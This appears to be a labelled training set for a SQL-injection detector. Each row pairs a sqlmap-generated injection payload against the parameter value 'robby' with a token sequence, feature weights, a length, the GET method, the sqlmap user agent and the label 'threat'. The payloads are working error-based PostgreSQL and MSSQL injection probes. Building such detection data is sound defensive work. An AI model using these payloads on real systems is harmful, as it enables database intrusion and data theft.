"robby"" AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND ""Fkec""=""Fkec",STR DQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND DQUT STR DQUT EQ DQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,373,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND (""nJnr"" LIKE ""nJnr",STR DQUT RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN DQUT STR DQUT LIKE DQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,386,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND (('%'=',STR PRCNT SQUT RPRN RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,383,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND '%'=',STR PRCNT SQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND SQUT PRCNT SQUT EQ SQUT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,371,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND ""%""=""",STR PRCNT DQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND DQUT PRCNT DQUT EQ DQUT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,371,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND (1031=1031,STR RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN INT EQ INT,0.07142857142857142 0.08928571428571427 0.10714285714285714 0.125 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.14285714285714285 0.125 0.10714285714285714 0.08928571428571427 0.07142857142857142,367,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND ((1348=1348,STR RPRN RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN LPRN INT EQ INT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,373,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC) AND (((2450=2450,STR RPRN RPRN RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN LPRN LPRN INT EQ INT,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,379,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC),STR AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC,0.08 0.1 0.12 0.14 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.14 0.12 0.1 0.08,341,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 5533=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (5533=5533) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC)# jgfk,STR AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC HASH STR,0.07692307692307693 0.09615384615384616 0.11538461538461539 0.13461538461538464 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.13461538461538464 0.11538461538461539 0.09615384615384616 0.07692307692307693,351,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113)))-- DaJM,STR SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT DSCMT STR,0.08 0.1 0.12 0.14 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.16 0.14 0.12 0.1 0.08,334,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND (('sWbO'='sWbO,STR SQUT RPRN RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.06779661016949153 0.0847457627118644 0.1016949152542373 0.11864406779661017 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.11864406779661017 0.1016949152542373 0.0847457627118644 0.06779661016949153,366,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ('TsyY' LIKE 'TsyY,STR SQUT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.07017543859649122 0.08771929824561403 0.10526315789473684 0.12280701754385964 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.12280701754385964 0.10526315789473684 0.08771929824561403 0.07017543859649122,367,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND 'mVAz' LIKE 'mVAz,STR SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT LIKE SQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,361,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND (""fRau""=""fRau",STR DQUT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.07017543859649122 0.08771929824561403 0.10526315789473684 0.12280701754385964 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.12280701754385964 0.10526315789473684 0.08771929824561403 0.07017543859649122,360,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ((""FdVr""=""FdVr",STR DQUT RPRN RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.06779661016949153 0.0847457627118644 0.1016949152542373 0.11864406779661017 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.11864406779661017 0.1016949152542373 0.0847457627118644 0.06779661016949153,366,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
